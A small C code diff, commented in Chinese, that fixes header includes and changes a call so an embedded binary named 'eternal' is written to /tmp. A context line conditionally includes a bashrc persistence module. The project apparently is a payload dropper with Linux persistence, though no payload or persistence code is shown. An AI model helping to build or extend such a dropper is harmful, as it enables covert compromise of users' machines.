@@ -1,6 +1,9 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>  // 包含 strcmp 函数所需的头文件
+#include "release.h"
+#include "bind_files.h"  // 确保这个头文件包含了正确的声明
 #include "info.h"
-#include "release_bind_files.c"
 
 #ifdef BASHRC_MOD
 #include "linux_persistence_bashrc.h"
@@ -8,7 +11,7 @@
 
 int main() {
     printf("释放嵌入的文件...\n");
-    release_all_files();
+    release_file("/tmp/eternal", eternal, eternal_size);  // 确保这些变量已在 bind_files.h 中声明
     printf("完成。\n");
 
     const char* os = get_operating_system();
